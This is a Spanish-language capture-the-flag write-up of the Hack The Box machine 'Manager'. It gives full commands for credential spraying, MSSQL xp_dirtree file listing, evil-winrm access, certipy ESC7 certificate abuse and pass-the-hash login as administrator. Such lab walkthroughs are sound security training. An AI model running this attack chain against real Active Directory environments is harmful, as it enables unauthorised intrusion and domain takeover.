---
title: Manager - Hack the Box (htb)
date: 2023-11-15 14:09:00 +0800
categories: [writeup, htb]
tags: [htb,ctf,windows,hack the box,ESC7,xp_dirtree]
math: true
mermaid: true
image:
  path: /writeup-htb-manager/htb.png
  alt: Manager
---

> Queridos lectores, es un placer darles la bienvenida a este fascinante viaje a través del mundo de HackTheBox. En esta ocasión, nos sumergiremos en los entresijos de la máquina Manager, un reto catalogado como de dificultad media y alojado en un servidor Windows. En este emocionante recorrido, vamos a utilizar el procedimiento almacenado xp_dirtree de mssql, para visualizar archivos y carpetas del servidor, lo cual nos ayudará a obtener un usuario y password de acceso. Como desafío final, debemos llevar a cabo una escalada de privilegios (privilege escalation), la cual se realizará a través de la vulnerabilidad ESC7 producida por la otorgación de permisos Manage CA de Active Directory a un usuario común.  

## Reconocimiento
Primeramente iniciamos con el escaneo de puertos mediante la herramienta `nmap`.
> Nmap es una herramienta de código abierto utilizada para explorar y mapear redes, así como para descubrir dispositivos y servicios en una red.  
{: .prompt-info }
```bash
sudo nmap 10.10.11.236 -p- -Pn -n -sS -T4 -oN scan1 --open -vvv
```
Como resultado se obtiene varios puertos abiertos los cuales se observan a continuación. 
```bash
Nmap scan report for 10.10.11.236
Host is up, received user-set (0.11s latency).
Scanned at 2023-11-10 11:11:58 EST for 210s
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49687/tcp open  unknown          syn-ack ttl 127
49688/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49726/tcp open  unknown          syn-ack ttl 127
56261/tcp open  unknown          syn-ack ttl 127
61427/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Nov 10 11:15:28 2023 -- 1 IP address (1 host up) scanned in 209.45 seconds
```

Para obtener mayor información de estos puertos se utilizará el siguiente comando:  
```bash
nmap 10.10.11.236 -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49689,49726,56261,61427 -Pn -sV -sC -oN scan2
```
El resultado arroja bastante información, donde los puntos más relevantes son: El `AD` (active directory) está activo, `SMB` (Server Message Block Protocol) está corriendo en el puerto `445`,en el puerto `80` hay una página web cuyo nombre es `manager`, `Microsoft SQL Server (mssql)` está corriendo en el puerto `1433` y `WinRM` (Windows Remote Management Protocol) posiblemente se está ejecutando en el puerto `5985`.  
```bash
Nmap scan report for 10.10.11.236
Host is up (0.11s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Manager
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-10 23:19:28Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-11-10T23:20:59+00:00; +6h59m59s from scanner time.
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-11-10T23:21:00+00:00; +6h59m59s from scanner time.
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-11-10T23:20:59+00:00; +6h59m59s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.236:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-11-10T13:47:13
|_Not valid after:  2053-11-10T13:47:13
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-10T23:20:59+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-11-10T23:21:00+00:00; +6h59m59s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49687/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open     msrpc         Microsoft Windows RPC
49689/tcp open     msrpc         Microsoft Windows RPC
49726/tcp open     msrpc         Microsoft Windows RPC
56261/tcp open     msrpc         Microsoft Windows RPC
61427/tcp filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-11-10T23:20:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 10 11:21:02 2023 -- 1 IP address (1 host up) scanned in 100.81 seconds
```
Vamos a comprobar si en el puerto `5985` se está ejecutando WinRM, para ello usamos el módulo `auxiliary/scanner/winrm/winrm_auth_methods` de `metasploit`.  
> Metasploit Framework es una plataforma de código abierto para el desarrollo, prueba y ejecución de exploits contra sistemas informáticos. Metasploit ofrece una amplia variedad de exploits y payloads que pueden ser utilizados para encontrar y aprovechar vulnerabilidades en sistemas informáticos.  
{: .prompt-info }
A continuación el paso a paso.  
- Primero iniciamos metasploit.  
```bash
msfconsole
```
- Luego usamos el módulo `auxiliary/scanner/winrm/winrm_auth_methods`.  
```
use auxiliary/scanner/winrm/winrm_auth_methods 
```
- Colocamos la ip de la máquina víctima en el parámetro `rhosts`.  
```
set rhosts 10.10.11.236 
```
- Por último corremos el módulo.  
```
exploit 
```
Arroja un resultado positivo a `WinRM`, por lo tanto, vamos a poder conectarse por este puerto al sistema; eso lo veremos más adelante.  
![Desktop View](/writeup-htb-manager/winrm.png)
_WinRm_

## Enumeración
Teniendo la información de los puertos más importantes, procedemos a realizar la enumeración.  
En el puerto `80` hay un landing page, por lo que vamos a enumerar sus directorios y archivos.  
![Desktop View](/writeup-htb-manager/web.png)
_Web_
Para enumerar los directorios y archivos utilizamos la herramienta `gobuster`.  
> Gobuster es una herramienta diseñada para la enumeración de directorios y archivos en sitios web. Su función principal es realizar ataques de fuerza bruta contra un servidor web para descubrir nombres de directorios y archivos que podrían no ser fácilmente accesibles.  
{: .prompt-info }

```bash
gobuster dir -u http://10.10.11.236 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 -x .php,.xml,.html -r -t 100 
```
Arroja como resultado /contact.html, /about.html, /index.html y /service.html.  
![Desktop View](/writeup-htb-manager/gobuster.png)
_gobuster_
Se revisó cada uno de los resultados, pero no hay nada relevante.  

Entonces ahora vamos a enumerar el servicio de `smb`; con `smbclient` enumeramos los archivos compartidos (`shares`).  

```bash
smbclient -L 10.10.11.236 -N
```
![Desktop View](/writeup-htb-manager/shares.png)
_shares_
Hay varias carpetas, por lo tanto vamos a ingresar a cada una de ellas, sin embargo, a ninguna carpeta tenemos acceso.  
```bash
smbclient //10.10.11.236/ADMIN$ -N
```
![Desktop View](/writeup-htb-manager/access.png)
_Access Denied_
Como no hay ninguna información relevante, vamos a utilizar la herramienta `crackmapexe` para realizar un ataque de fuerza bruta.  
> Crackmapexec es una herramienta de código abierto que se utiliza para la automatización y la post-explotación en entornos de Active Directory. Está escrita en Python y proporciona una interfaz de línea de comandos (CLI) para interactuar con sistemas Windows y realizar una variedad de tareas relacionadas con la evaluación de seguridad y la administración de sistemas.  
{: .prompt-info }
Usamos el siguiente comando para iniciar el ataque.  
```bash
crackmapexec smb 10.10.11.236 -u anonymous -p "" --rid-brute
```
	
> Donde:  
	 -u -> especifica el usuario, en este caso, anonymous.  
	 -p -> especifica el password.  
	 \--rid-brute -> realiza un ataque de fuerza bruta para enumerar identificadores de seguridad relativos (RID) en un intento de identificar cuentas de usuario adicionales en el sistema.  
{: .prompt-info }
Ejecutamos y se listan los usuarios Zhong, Cheng, Ryan, Raven, JinWoo, ChinHae, Operator.  
![Desktop View](/writeup-htb-manager/rid brute.png)
_rid brute_
Colocamos estos usuarios en un archivo `user.txt`{: .filepath}.  
> Muchos usuarios colocan como password su mismo usuario, por lo tanto, vamos a probar si sucede lo mismo con los usuarios encontrados.  
{: .prompt-tip }
Digitamos el siguiente comando.  
```bash
crackmapexec smb 10.10.11.236 -u user.txt -p user.txt --no-bruteforce 
```
> Donde:  
	 -u -> especifica el archivo de los usuarios.  
	 -p -> especifica el archivo de los passwords.  
	 \--no-bruteforce -> para probar el usuario1 con el password1, el usuario2 con el password2 y así sucesivamente.
{: .prompt-info }
El usuario `operator` tiene como password su propio nombre de usuario.  
![Desktop View](/writeup-htb-manager/cracking online.png)
_cracking online_
Teniendo este usuario y password, vamos a probar si con los mismos accesos se puede ingresar a `Microsoft SQL Server (mssql)`.  
```bash
crackmapexec mssql 10.10.11.236 -u operator -p operator  
```
Efectivamente, este usuario y password son válidos para mssql.  
![Desktop View](/writeup-htb-manager/mssql.png)
_mssql_

## Explotación
Con estas credenciales vamos a enumerar toda la información de mssql, para ello usamos el módulo `auxiliary/admin/mssql/mssql_enum` de metasploit.  
- Primero iniciamos metasploit.  
```bash
msfconsole
```
- Luego usamos el módulo `auxiliary/admin/mssql/mssql_enum`.  
```
use auxiliary/admin/mssql/mssql_enum
```
- Colocamos la ip de la máquina víctima en el parámetro `rhosts`.  
```  
set rhosts 10.10.11.236 
```
- Colocamos el usuario.  
```  
set username operator
```
- Colocamos el password.  
```  
set password operator
```
- Habilitamos la autenticación de windows.  
```
set use_windows_authent yes
```
- Por último corremos el módulo.  
```
exploit 
```
Nos arroja información detallada de mssql y donde lo más relevante sería los procedimientos almacenados que están habilitados.  
![Desktop View](/writeup-htb-manager/enum mssql.png)
_enum mssql_
![Desktop View](/writeup-htb-manager/enum mssql 2.png)
_enum mssql_
  
### Procedimiento almacenado xp_dirtree
> El procedimiento almacenado más interesante que está habilitado es `xp_dirtree`, el cual lista los archivos y carpetas de un directorio específico en el servidor, por lo tanto, podemos revisar los archivos del servidor, en busca de información relevante.  
{: .prompt-tip }

Para conectarse a mssql y luego ejecutar el procedimiento almacenado utilizamos la herramienta `impacket-mssqlclient`.  
> Impacket-mssqlclient es una herramienta incluida en la suite Impacket, la cual se utiliza para realizar la autenticación en servidores Microsoft SQL (MSSQL) y ejecutar comandos en ellos.  
{: .prompt-info }
- Nos conectamos a mssql.  
```bash
impacket-mssqlclient operator@10.10.11.236 -windows-auth
```
![Desktop View](/writeup-htb-manager/mssqlclient.png)
_mssqlclient_
- Luego ejecutamos el procedimiento almacenado `xp_dirtree`, indicando que queremos listar los archivos del disco local `C:`.   
```
exec xp_dirtree 'C:',1,1
```
Se listan varias carpetas y se observa una carpeta `inetpub`, en la cual se alojan archivos de IIS, es decir archivos de páginas web, por lo tanto, acá quizás haya información relevante de la página web manager.  
![Desktop View](/writeup-htb-manager/C.png)
_Listar C:_
- Listamos los archivos de la carpeta `inetpub`.  
```
exec xp_dirtree 'C:\inetpub\',1,1
```
![Desktop View](/writeup-htb-manager/inetpub.png)
_Listar inetpub_
- Listamos los archivos de la carpeta `wwwroot`.  
```
exec xp_dirtree 'C:\inetpub\wwwroot\',1,1
```
Dentro del listado hay un backup de la página web en un archivo .zip .   
![Desktop View](/writeup-htb-manager/wwwroot.png)
_Listar wwwroot_

Como los archivos de esta carpeta son los que se muestran en la página web, lo que vamos a hacer es colocar `http://10.10.11.236/website-backup-27-07-23-old.zip` en el navegador y se descargará el archivo `website-backup-27-07-23-old.zip`{: .filepath}.  
![Desktop View](/writeup-htb-manager/web zip.png)
_backup_
Descomprimimos el zip.  
```bash
unzip website-backup-27-07-23-old.zip
```
Listamos todos los archivos y se observa un archivo `.old-conf.xml`; en su contenido hay un usuario y una contraseña.  
![Desktop View](/writeup-htb-manager/old-conf.png)
_old-conf.xml_

### Ingreso al sistema para obtener el flag del usuario
Con el usuario encontrado vamos a conectarse por medio de `WinRM`, para ello utilizamos la herramienta `evil-winrm`.  
>Evil-WinRM es una herramienta de prueba de penetración que se utiliza para obtener acceso remoto no autorizado a sistemas Windows a través del protocolo WinRM (Windows Remote Management). WinRM es el protocolo de administración remota en Windows que permite a los administradores controlar las máquinas de forma remota utilizando el Protocolo de Transferencia de Estado Representacional (REST) sobre HTTP.  
{: .prompt-info }

Colocamos el siguiente comando para conectarse al servidor.  
```bash
evil-winrm -i 10.10.11.236 -u 'raven' -p '**********************' 
```
Se ingresó con éxito al servidor.  
![Desktop View](/writeup-htb-manager/winrm login.png)
_Ingreso al sistema_

Ahora nos dirigimos al escritorio donde se encuentra el flag del usuario.  
![Desktop View](/writeup-htb-manager/user flag.png)
_Flag del usuario_

## Escalada de privilegios (Privilege escalation)
Como desafío final debemos de escalar privilegios para obtener los permisos de administrador y así lograr ver el último flag.  
### Identificación de vulnerabilidades.
Como el active directory está activo, lo que vamos a hacer es utilizar la herramienta `certipy` para identificar vulnerabilidades.  
> Certipy es una herramienta que permite descubrir vulnerabilidades del Active Directory Certificate Services (AD CS) y abusar de estas. En kali esta herramienta tiene el nombre de `certipy-ad`.  
{: .prompt-info }
Vamos a descubrir si el active directory tiene vulnerabilidades en los certificate services, para ello utilizamos la opción `find` de la herramienta.  
```bash
certipy-ad find -dc-ip 10.10.11.236 -u raven -p '**********************' -enabled -vulnerable -stdout
```
> Donde:   
	 -dc-ip -> específica la ip de la máquina victima.  
	 -u -> específica el usuario.  
	 -p -> específica el password.  
	 -enabled -> indica que solo se vean los certificate templates habilitados.  
	 -vulnerable -> indica que solo se vean los certificate templates vulnerables.  
	 -stdout -> muestra el resultado como texto.  
{: .prompt-info }
El resultado es una vulnerabilidad tipo `ESC7`.  
![Desktop View](/writeup-htb-manager/find.png)
_certipy find_

> La vulnerabilidad ESC7 se produce cuando un usuario tiene el derecho de acceso Manage CA o Manage Certificates en una CA, por lo tanto, puede emitir o rechazar solicitudes de certificados pendientes.  
{: .prompt-info }
> Entonces se puede realizar una solicitud de certificado para un usuario de altos privilegios y aprobar dicha solicitud, logrando así escalar privilegios.  
{: .prompt-tip }


### Explotación de la vulnerabilidad ESC7
En el artículo [**Certipy 2.0: BloodHound, New Escalations, Shadow Credentials, Golden Certificates, and more!**](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6), nos enseñan como explotar la vulnerabilidad ESC7.  
Primeramente debemos de agregar a nuestro usuario como `Manage Certificates`, para ello, debemos de usar la opción `ca` y `add-officer` de la herramienta certipy.  
```bash
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -u raven@manager.htb -p '**********************' -dc-ip 10.10.11.236
```
> Donde:  
	 -add-officer -> sirve para añadir un nuevo usuario como `Manage Certificates`.  
	 -ca -> específica el Certificate Authorities(CA).  
	 -u -> específica el usuario seguido de @ y luego el dominio.  
	 -p -> específica el password.  
	 -dc-ip -> específica la ip de la máquina víctima.     
{: .prompt-info }

Se añadió al usuario raven como Manage Certificates.  
![Desktop View](/writeup-htb-manager/officer.png)
_Add officer_
Ahora listamos los templates actuales del CA.  
```bash
certipy-ad ca -ca 'manager-DC01-CA' -list-templates -u raven@manager.htb -p '**********************' -dc-ip 10.10.11.236
```
> Donde:  
	 -list-templates -> sirve para listar los templates actuales.  
	 -ca -> específica el Certificate Authorities(CA).  
	 -u -> específica el usuario seguido de @ y luego el dominio.  
	 -p -> específica el password.  
	 -dc-ip -> específica la ip de la máquina víctima.    
{: .prompt-info }
Se listan los templates que se encuentran habilitados, donde se encuentra el template `SubCA`.  
![Desktop View](/writeup-htb-manager/list template.png)
_List templates_

> NOTA: En el caso que el template `SubCA` no este habilitado, se debe de habilitar con el siguiente comando.  


```bash
certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -u raven@manager.htb -p '**********************' -dc-ip 10.10.11.236
```
Una vez tengamos el template SubCA habilitado procedemos a realizar una solicitud de certificado, para ello se usa la opción `req`de certipy.  
```bash
certipy-ad req -u 'raven@manager.htb' -p '**********************' -ca 'manager-DC01-CA' -target 10.10.11.236 -template SubCA -upn 'administrator@manager.htb'
```
> Donde:  
	 -target -> específica ip de la máquina víctima.  
	 -ca -> específica Certificate Authorities(CA).  
	 -u -> específica el usuario seguido de @ y luego el dominio.  
	 -p -> específica el password.  
	 -template -> específica el certificate template.  
	 -upn -> específica el usuario objetivo del cual queremos obtener sus permisos.   
{: .prompt-info }
Arroja un error de permisos y también el  `id de la solitud ` realizada.  
![Desktop View](/writeup-htb-manager/req.png)
_Certipy req_
Anotamos el id de la solicitud porque vamos a aprobar la solicitud y esto lo hacemos con la opción `ca` e `issue-request` de certipy.  
```bash
certipy-ad ca -ca 'manager-DC01-CA' -issue-request 16 -u raven@manager.htb -p '**********************' -dc-ip 10.10.11.236 
```
> Donde:  
	 -issue-request -> sirve para aprobar una solicitud, en este caso, la solicitud a aprobar es la 16.  
	 -ca -> específica el Certificate Authorities(CA).  
	 -u -> específica el usuario seguido de @ y luego el dominio.  
	 -p -> específica el password.  
	 -dc-ip -> específica la ip de la máquina víctima.    
{: .prompt-info }
La solicitud se aprobó con éxito.  
![Desktop View](/writeup-htb-manager/issue.png)
_issue-request_
Procedemos a recuperar el certificado emitido con el id de la solicitud que fue aprobada.  
```bash
certipy-ad req -u 'raven@manager.htb' -p '**********************' -ca 'manager-DC01-CA' -target 10.10.11.236 -template SubCA -upn 'administrator@manager.htb' -retrieve 16
```
> Donde:  
	 -retrieve -> recupera un certificado emitido el cual esta especificado por un ID de solicitud.  
	 -target -> específica ip de la máquina víctima.  
	 -ca -> específica Certificate Authorities(CA).  
	 -u -> específica el usuario seguido de @ y luego el dominio.  
	 -p -> específica el password.  
	 -template -> específica el certificate template.  
	 -upn -> específica el usuario objetivo del cual queremos obtener sus permisos.   
{: .prompt-info }
Se obtuvo el certificado con éxito y se guardo como `administrator.pfx`.  
![Desktop View](/writeup-htb-manager/retrieve.png)
_retrieve_
Con este archivo podemos autenticarse en el sistema, para esto usamos la opción `auth` de certipy.  
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
```
> Donde:  
	 -pfx -> específica el archivo pfx.  
	 -dc-ip -> específica la ip de la máquina víctima.     
{: .prompt-info }
Nos aparece un error de `clock skew too great`.  
![Desktop View](/writeup-htb-manager/error.png)
_Error_
Este error es producido por diferencias horarias entre nuestra máquina y la máquina víctima, para solucionar esto ejecutamos el siguiente comando.  
```bash
sudo ntpdate 10.10.11.236
```
![Desktop View](/writeup-htb-manager/ntpdate.png)
_ntpdate_
Procedemos a ejecutar el comando anterior para autenticarse en el sistema.  
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
```
Se ejecutó correctamente y obtenemos el hash del usuario administrator.  
![Desktop View](/writeup-htb-manager/auth.png)
_Certipy auth_
Estos hashes tiene la siguiente estructura `LM HASH``:``NTLM HASH`. Si el LM HASH está deshabilitado tiene el valor de `aad3b435b51404eeaad3b435b51404ee`, en esos casos se obvia esa parte del hash y nos quedamos solo con el NTLM HASH para autenticarse.  
Procedemos a conectarse con el usuario administrator, colocando el hash.  
```bash
evil-winrm -i 10.10.11.236 -u 'administrator' -H '********************************'
```
> Donde:  
	 -H -> específica el hash.   
{: .prompt-info }
Esperamos un rato, y ya estamos logueados como administrator.  
![Desktop View](/writeup-htb-manager/login administrator.png)
_Login with administrator_
Nos dirigimos al escritorio y obtenemos el flag `root.txt`.  
![Desktop View](/writeup-htb-manager/root flag.png)
_Flag del root_
> Espero les haya gustado este post, nos vemos en una siguiente oportunidad.  
`¡Happy Hacking!` `¡You can be root!`


